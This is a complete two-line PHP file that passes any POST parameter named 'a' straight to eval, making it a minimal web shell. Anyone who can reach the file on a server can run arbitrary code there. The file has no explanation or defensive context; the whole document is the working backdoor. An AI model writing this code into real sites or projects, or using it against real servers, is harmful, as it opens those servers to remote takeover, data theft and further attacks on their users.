<?php
eval($_POST[a]);